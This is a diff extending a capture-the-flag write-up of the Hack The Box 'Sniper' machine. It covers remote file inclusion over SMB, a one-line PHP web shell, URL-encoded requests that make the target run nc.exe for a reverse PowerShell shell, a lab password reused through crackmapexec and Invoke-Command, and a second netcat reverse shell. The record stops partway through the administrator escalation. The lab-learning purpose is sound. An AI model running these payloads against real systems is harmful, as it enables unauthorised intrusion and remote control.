@@ -1,6 +1,8 @@
 https://app.hackthebox.com/machines/211
 
 ## Sniper - Explore and Nmapping
+<br>
+
 
 New machine, no hints or something suspicious from a first look.
 So we'll beging with nmap
@@ -86,7 +88,8 @@ changing "?lang=" to test and it's redirecting us to a 404.
 let's try fetching a system file with setting "?lang="'s value to "/windows/system.ini"
 
 ![found!](https://is-going-to-rick-roll.me/1639742931.png)
-and... it worked. now let's see if we can LFI over SMB.
+<br>
+and... it worked. now let's see if we can RFI over SMB.
 
 starting np
 
@@ -104,6 +107,8 @@ and we've got a request from the server.
 ![nvlvp result](https://is-going-to-rick-roll.me/1639746488.png)
 
 ###### Setting our new work directory
+<br>
+
 
 to continiue we'll have to modify smb.conf
 ```bat
@@ -148,11 +153,12 @@ smbmap -H 10.10.14.11
 
 
 #### Setting up the RCE script
+<br>
 
-After we maked sure all the services are up and running we can make a new file in out new work directory named rcesrc.php
+After we maked sure all the services are up and running we can make a new file in out new work directory named notrace.php
 
 ```bat
-sudo nano rcesrc.php
+sudo nano notrace.php
 ```
 
 and we'll write the next code into it.
@@ -161,7 +167,7 @@ and we'll write the next code into it.
 <?php system($_REQUEST['rce']); ?>
 ```
 
-Now let's try it out and the parameter for lang that we are sending now will be <mark>\\10.10.14.5\htb\notrce.php&rce=whoami
+Now let's try it out and the parameter for lang that we are sending now will be <mark>\\10.10.14.5\htb\notrace.php&rce=whoami
 </mark> (change the IP aadress with your own one)
 
 form the result we can see that the RCE has worked and we executed code on the machine.
@@ -177,12 +183,29 @@ Now let's move the nc.exe file from the shares folder to our work directory that
 sudo cp ~/../../usr/share/windows-resources/binaries/nc.exe .
 ```
 
+and another tool (that we'll use later on)
+
+```bat
+sudo cp ../../../../../../usr/share/windows-resources/binaries/plink.exe .
+```
+
 Now, we can call this file to get it executed by the machine and get a shell. to do so we'll change the parameter again to nc.exe and send this connection back to us.
 
 
-(make sure to encode this url in burp suite otherwise it will not execute)
+(make sure to encode this url and change the attaker IP in burp suite otherwise it will not execute)
 ```s
 rce=\\10.10.14.11\htb\nc.exe 10.10.14.11 9001 -e powershell
+```
+
+GET payload ->
+
+```s
+GET /blog/?lang=\\10.10.14.11\htb\notrace.php&rce=\\10.10.14.11\htb\nc.exe 10.10.14.11 9001 -e powershell 
+
+
+(After encode)
+
+GET /blog/?lang=\\10.10.14.11\htb\notrace.php&rce=%5c%5c%31%30%2e%31%30%2e%31%34%2e%31%31%5c%68%74%62%5c%6e%63%2e%65%78%65%20%31%30%2e%31%30%2e%31%34%2e%31%31%20%39%30%30%31%20%2d%65%20%70%6f%77%65%72%73%68%65%6c%6c
 ```
 
 and run netcat listner on the same port
@@ -197,6 +220,90 @@ congrats we have reverse shell!
 
 
 ##### Exploring the machine
+<br>
+
+Checking for what users we have
+
+```bat
+net user
+```
+![net user result](https://is-going-to-rick-roll.me/1639763907.png)
+
+```bat
+net user Chris
+```
+
+![net user chris result](https://is-going-to-rick-roll.me/1639763972.png)
+
+Earlyer we asw in the "db.php" file a password that we might can use for something, and with the result we can see the last modify date of the password and It's the same date as the db.php file last changed. we'll use crackmapexec to broute-force the machine and log-in.
+
+Let's run crackmapexec -> 
+
+```bat
+crackmapexec smb 10.10.10.151 -u chris -p '36mEAhz/B8xQ~2VM'
+```
+
+![crackmapexec result!](https://is-going-to-rick-roll.me/1639764424.png)
+
+#### Privilege Escalation | Chris
+<br>
+
+Now we can confirm the sniper/chris is a valid user with the same password we found, we can use these credentials to remote and get a shell back as Chris.
+
+
+Now we knwo the other users on the machine and we can try running on chris.
+
+```bat
+$user = "Sniper\Chris"
+
+$password = "36mEAhz/B8xQ~2VM"
+
+$secretstr = New-Object -TypeName System.Security.SecureString
+
+$password.ToCharArray() | ForEach-Object {$secretstr.AppendChar($_)}
+
+
+$credentials = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $secretstr
+
+Invoke-Command -ScriptBlock { whoami } -Credential $credentials -Computer localhost
+
+```
+
+Now when have have privilege escalation and we are able to run as other users, we'll get our first flag "user.txt"
+
+```bat
+Invoke-Command -ScriptBlock { type \users\chris\desktop\user.txt } -Credential $credentials -Computer localhost
+```
+![user flag](https://is-going-to-rick-roll.me/1639842780.png)
+
+
+
+#### Privilege Escalation |  Administrator
+<br>
+
+Let's create a pipe to chris to make it easier on us
+
+
+run on your machine (on our work dir) ->
+```bat
+sudo nc -lnvp 443
+```
+
+Run on sniper (change the attacker IP) ->
+```bat
+Invoke-Command -ScriptBlock { \\10.10.14.11\htb\nc.exe -e cmd 10.10.14.11 443 } -Credential $credentials -Computer localhost
+```
+
+![we're running as chris](https://is-going-to-rick-roll.me/1639843273.png)
+
+Our bsic plan from a first view we might want to preform another privilege escalation
+from Chris -> Administrator.
+
+
+Since we are on a new user now with more permissions let's review the folders and files check for hints and maybe passwords.
+
+
+
 
 
 
